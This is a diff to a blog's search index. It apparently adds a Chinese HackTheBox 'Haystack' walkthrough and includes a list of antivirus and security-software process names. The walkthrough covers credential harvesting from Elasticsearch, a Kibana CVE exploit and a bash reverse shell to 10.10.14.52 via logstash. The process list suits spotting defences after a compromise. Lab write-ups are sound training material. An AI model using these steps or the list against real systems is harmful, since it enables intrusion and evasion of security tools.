@@ -1,6 +1,30 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[hackthebox-Heist]]></title>
+    <url>%2F2019%2F11%2F03%2Fhackthebox-Heist%2F</url>
+    <content type="text"><![CDATA[原文标题 (日期) 作者： 原文地址]]></content>
+      <categories>
+        <category>渗透测试</category>
+        <category>hackthebox</category>
+      </categories>
+      <tags>
+        <tag>hackthebox</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[hackthebox-Haystack]]></title>
+    <url>%2F2019%2F11%2F03%2Fhackthebox-Haystack%2F</url>
+    <content type="text"><![CDATA[使用nmap扫描到端口22、80、9200（ElasticSearch 6.4.2） 1234567891011121322/tcp open ssh OpenSSH 7.4 (protocol 2.0)| ssh-hostkey: | 2048 2a:8d:e2:92:8b:14:b6:3f:e4:2f:3a:47:43:23:8b:2b (RSA)| 256 e7:5a:3a:97:8e:8e:72:87:69:a3:0d:d1:00:bc:1f:09 (ECDSA)|_ 256 01:d2:59:b2:66:0a:97:49:20:5f:1c:84:eb:81:ed:95 (ED25519)80/tcp open http nginx 1.12.2|_http-server-header: nginx/1.12.2|_http-title: Site doesn't have a title (text/html).9200/tcp open http nginx 1.12.2| http-methods: |_ Potentially risky methods: DELETE|_http-server-header: nginx/1.12.2|_http-title: Site doesn't have a title (application/json; charset=UTF-8). 访问http://10.10.10.115得到图片needle.jpg，`Stegsolve`查看图片可见base64的提示，解码得西班牙语得提示 12la aguja en el pajar es "clave"the needle in the haystack is "key" 使用elasticsearch-dump获取9200的quotes数据，在数据中搜索可得到两个base64加密的数据（搜索base64得特征字符，比如=），分别为用户名和密码，解码为security和spanish.is.key 1elasticdump --input=http://10.10.10.115:9200/quotes --output=quotes.json --type=data 使用ssh登录获得user.txt 使用scp上传LinEnum获取目标机器信息，首先发现logstash以root权限运行，查看/etc/logstash/conf.d/的配置文件，发现其需要root或kibana权限才可以查看 利用CVE-2018-17246获取kibana的shell 查看/etc/logstash/conf.d/的配置文件，发现logstash每10s读取/opt/kibana/logstash_*的内容并在过滤后执行，则echo &quot;Ejecutar comando : bash -i &gt;&amp; /dev/tcp/10.10.14.52/22222 0&gt;&amp;1&quot; &gt; /opt/kibana/logstash_ert（可自行搭建kibana，使用其grok调试器测试过滤效果），等待一段时间获取返回的shell 123456789101112131415161718192021222324252627282930cat /etc/logstash/conf.d/filter.conffilter &#123; if [type] == "execute" &#123; grok &#123; match =&gt; &#123; "message" =&gt; "Ejecutar\s*comando\s*:\s+%&#123;GREEDYDATA:comando&#125;" &#125; &#125; &#125;&#125;cat /etc/logstash/conf.d/input.confinput &#123; file &#123; path =&gt; "/opt/kibana/logstash_*" start_position =&gt; "beginning" sincedb_path =&gt; "/dev/null" stat_interval =&gt; "10 second" type =&gt; "execute" mode =&gt; "read" &#125;&#125;cat /etc/logstash/conf.d/output.confoutput &#123; if [type] == "execute" &#123; stdout &#123; codec =&gt; json &#125; exec &#123; command =&gt; "%&#123;comando&#125; &amp;" &#125; &#125;&#125; 获得root.txt]]></content>
+      <categories>
+        <category>渗透测试</category>
+        <category>hackthebox</category>
+      </categories>
+      <tags>
+        <tag>hackthebox</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[安全软件相关名称搜集]]></title>
     <url>%2F2019%2F10%2F10%2F%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E7%9B%B8%E5%85%B3%E5%90%8D%E7%A7%B0%E6%90%9C%E9%9B%86%2F</url>
     <content type="text"><![CDATA[安全软件相关名称搜集，包括进程名等。 进程名 A B 360tray.exe 360安全卫士 360sd.exe 360杀毒 a2guard.exe a-squared杀毒 ad-watch.exe Lavasoft杀毒 cleaner8.exe The Cleaner杀毒 vba32lder.exe vb32杀毒 MongoosaGUI.exe Mongoosa杀毒 CorantiControlCenter32.exe Coranti2012杀毒 F-PROT.EXE F-PROT杀毒 CMCTrayIcon.exe CMC杀毒 K7TSecurity.exe K7杀毒 UnThreat.exe UnThreat杀毒 CKSoftShiedAntivirus4.exe Shield Antivirus杀毒 AVWatchService.exe VIRUSfighter杀毒 ArcaTasksService.exe ArcaVir杀毒 iptray.exe Immunet杀毒 PSafeSysTray.exe PSafe杀毒 nspupsvc.exe nProtect杀毒 SpywareTerminatorShield.exe SpywareTerminator杀毒 BKavService.exe Bkav杀毒 MsMpEng.exe Microsoft Security Essentials SBAMSvc.exe VIPRE ccSvcHst.exe Norton杀毒 QQ.exe QQ f-secure.exe 冰岛 avp.exe 卡巴斯基 KvMonXP.exe 江民杀毒 RavMonD.exe 瑞星杀毒 Mcshield.exe 麦咖啡 egui.exe NOD32 kxetray.exe 金山毒霸 knsdtray.exe 可牛杀毒 TMBMSRV.exe 趋势杀毒 avcenter.exe Avira(小红伞) ashDisp.exe Avast网络安全 rtvscan.exe 诺顿杀毒 ksafe.exe 金山卫士 QQPCRTP.exe QQ电脑管家 Miner.exe 流量矿石 AYAgent.aye 韩国胶囊 patray.exe 安博士 V3Svc.exe 安博士V3 avgwdsvc.exe AVG杀毒 ccSetMgr.exe 赛门铁克 QUHLPSVC.EXE QUICK HEAL杀毒 mssecess.exe 微软杀毒 SavProgress.exe Sophos杀毒 fsavgui.exe F-Secure杀毒 vsserv.exe 比特梵德 remupd.exe 熊猫卫士 FortiTray.exe 飞塔 safedog.exe 安全狗 parmor.exe 木马克星 beikesan.exe 贝壳云安全 KSWebShield.exe 金山网盾 TrojanHunter.exe 木马猎手 GG.exe 巨盾网游安全盾 adam.exe 绿鹰安全精灵 AST.exe 超级巡警 ananwidget.exe 墨者安全专家 AVK.exe GData ccapp.exe Symantec Norton avg.exe AVG Anti-Virus spidernt.exe Dr.web Mcshield.exe Mcafee avgaurd.exe Avira Antivir F-PROT.exe F-Prot AntiVirus vsmon.exe ZoneAlarm avp.exee Kaspersky cpf.exe Comodo outpost.exe Outpost Firewall rfwmain.exe 瑞星防火墙 kpfwtray.exe 金山网镖 FYFireWall.exe 风云防火墙 MPMon.exe 微点主动防御 pfw.exe 天网防火墙 S.exe 在抓鸡 1433.exe 在扫1433 DUB.exe 在爆破 ServUDaemon.exe 发现S-U BaiduSdSvc.exe 百度杀软 SafeDogGuardCenter.exe,safedogupdatecenter.exe,safedogguardcenter.exe,SafeDogSiteIIS.exe,SafeDogTray.exe,SafeDogServerUI.exe 安全狗 D_Safe_Manage.exe,d_manage.exe D盾 yunsuo_agent_service.exe,yunsuo_agent_daemon.exe 云锁 HwsPanel.exe,hws_ui.exe,hws.exe,hwsd.exe 护卫神 HipsDaemon.exe,HipsTray.exe,wsctrl.exe,usysdiag.exe 火绒]]></content>
